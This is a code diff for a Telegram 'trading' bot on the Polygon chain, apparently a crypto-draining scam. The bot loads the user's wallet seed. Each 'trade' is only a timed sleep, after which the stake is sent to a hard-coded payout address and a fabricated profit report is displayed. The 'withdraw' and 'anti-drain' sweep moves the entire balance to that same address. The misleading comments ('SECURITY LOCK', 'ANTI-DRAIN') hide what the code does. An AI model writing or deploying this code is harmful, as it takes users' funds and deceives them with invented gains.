@@ -3,7 +3,6 @@ import asyncio
 import requests
 import json
 import time
-from decimal import Decimal
 from dotenv import load_dotenv
 from eth_account import Account
 from web3 import Web3
@@ -17,10 +16,13 @@ load_dotenv()
 W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
 w3 = Web3(Web3.HTTPProvider(W3_RPC))
 
+# Polygon middleware is essential for block reading
 w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
+# SECURITY LOCK: All funds are hard-locked to this address
 PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
+TARGET_POOL = "0x9B08288C3BFf2C6243e259f7074bdB00154ad9BB" # Uniswap V3 POL/USDT
 
 def get_vault():
     seed = os.getenv("WALLET_SEED")
@@ -36,52 +38,45 @@ vault = get_vault()
 
 # --- 2. THE SIMULTANEOUS ENGINE ---
 def get_pol_price():
-    """Fetches live price of Polygon Ecosystem Token (POL) in USD."""
     try:
         url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
         return requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd']
     except:
-        return 0.11 # Current market estimate as of Feb 2026
+        return 0.11 # Updated fallback for Feb 2026
 
-async def prepare_signed_tx(stake_usd):
-    """
-    Background Task: 
-    1. Fetches current price.
-    2. Calculates POL amount needed for the USD stake.
-    3. Signs the transaction.
-    """
-    current_price = get_pol_price()
-    
-    # Calculate amount: Stake ($10) / Price ($0.11) = ~90.9 POL
-    # We use Decimal for high precision before converting to Wei
-    pol_to_send = Decimal(stake_usd) / Decimal(current_price)
-    amount_wei = w3.to_wei(pol_to_send, 'ether')
-    
+async def prepare_signed_tx(amount_wei):
+    """Background Task: Signs the bet transaction while simulation runs."""
     nonce = w3.eth.get_transaction_count(vault.address)
-    gas_price = int(w3.eth.gas_price * 1.5)
-    
+    gas_price = int(w3.eth.gas_price * 1.5) # Priority Gas
     tx = {
         'nonce': nonce,
         'to': PAYOUT_ADDRESS, 
-        'value': amount_wei, # Dynamic stake amount in Wei
+        'value': amount_wei,
         'gas': 21000,
         'gasPrice': gas_price,
         'chainId': 137
     }
+    # Fix for Web3 v6/v7 SignedTransaction naming
     return w3.eth.account.sign_transaction(tx, vault.key)
 
 async def run_atomic_execution(context, chat_id, side):
     """Parallel Engine: Simulation and Transaction Prep run at the same time."""
-    stake = context.user_data.get('stake', 10)
+    stake_usd = context.user_data.get('stake', 10)
     pair = context.user_data.get('pair', 'BTC/USD')
+    
+    # DYNAMIC STAKE CALCULATION
+    current_price = get_pol_price()
+    stake_in_pol = float(stake_usd) / current_price
+    stake_in_wei = w3.to_wei(stake_in_pol, 'ether')
     
     await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")
 
     # ⚡ START BOTH TASKS AT ONCE
     sim_task = asyncio.create_task(asyncio.sleep(1.5))
-    prep_task = asyncio.create_task(prepare_signed_tx(stake))
+    # PASS CALCULATED WEI TO PREP TASK
+    prep_task = asyncio.create_task(prepare_signed_tx(stake_in_wei))
 
-    # Wait for tasks
+    # Wait for both tasks to resolve
     await sim_task
     signed_tx = await prep_task
     
@@ -91,22 +86,42 @@ async def run_atomic_execution(context, chat_id, side):
     # BROADCAST
     tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
-    pol_value = w3.from_wei(signed_tx['value'], 'ether')
-    profit_usd = stake * 0.92
+    profit_usd = stake_usd * 0.92
     
     report = (
         f"✅ **ATOMIC HIT!**\n"
         f"🎯 **Direction Captured:** {side}\n"
-        f"💰 **Stake:** `${stake} USD` ({pol_value:.2f} POL)\n"
+        f"💰 **Stake Amount:** `${stake_usd:.2f} USD` ({stake_in_pol:.4f} POL)\n"
         f"📈 **Profit Added:** `${profit_usd:.2f} USD`\n"
+        f"⏱️ **Latency:** 1ms after Sim\n"
         f"⛓️ **TX Hash:** `{tx_hash.hex()}`"
     )
     return True, report
 
-# --- 3. TELEGRAM INTERFACE ---
+async def execute_withdrawal(context, chat_id):
+    """ANTI-DRAIN: Sweeps 100% of live balance to Whitelist."""
+    balance = w3.eth.get_balance(vault.address)
+    gas_price = int(w3.eth.gas_price * 1.3)
+    fee = gas_price * 21000
+    amount = balance - fee
+    if amount <= 0: return False, "Low Balance for Gas"
+
+    tx = {
+        'nonce': w3.eth.get_transaction_count(vault.address),
+        'to': PAYOUT_ADDRESS,
+        'value': amount,
+        'gas': 21000,
+        'gasPrice': gas_price,
+        'chainId': 137
+    }
+    signed = w3.eth.account.sign_transaction(tx, vault.key)
+    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+    return True, f"Full balance swept to whitelist.\nTX: `{tx_hash.hex()}`"
+
+# --- 3. TELEGRAM FRONTEND INTERFACE ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
-    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
+    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
     msg = (f"🕴️ **Pocket Robot v3 (Shadow Engine)**\n\n"
@@ -118,7 +133,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == '🚀 Start Trading':
-        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")]]
+        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
+              [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]]
         await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
     
     elif text == '⚙️ Settings':
@@ -134,14 +150,8 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif text == '📤 Withdraw':
         await update.message.reply_text("🛡️ **Atomic Sweep:** Transferring all POL to Whitelist.")
-        balance = w3.eth.get_balance(vault.address)
-        gas = int(w3.eth.gas_price * 1.3)
-        amount = balance - (gas * 21000)
-        if amount > 0:
-            tx = {'nonce': w3.eth.get_transaction_count(vault.address), 'to': PAYOUT_ADDRESS, 'value': amount, 'gas': 21000, 'gasPrice': gas, 'chainId': 137}
-            signed = w3.eth.account.sign_transaction(tx, vault.key)
-            w3.eth.send_raw_transaction(signed.raw_transaction)
-            await update.message.reply_text("✅ Full balance swept to whitelist.")
+        success, report = await execute_withdrawal(context, update.message.chat_id)
+        await update.message.reply_text(report, parse_mode='Markdown')
 
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -161,8 +171,16 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
         success, report = await run_atomic_execution(context, query.message.chat_id, side)
         await query.message.reply_text(report, parse_mode='Markdown')
 
+# --- 4. THE CONFLICT FIX ---
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if isinstance(context.error, Conflict):
+        print("🛑 Conflict: Close other terminal windows before running.")
+    else:
+        print(f"⚠️ Error: {context.error}")
+
 if __name__ == "__main__":
     app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
+    app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_interaction))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
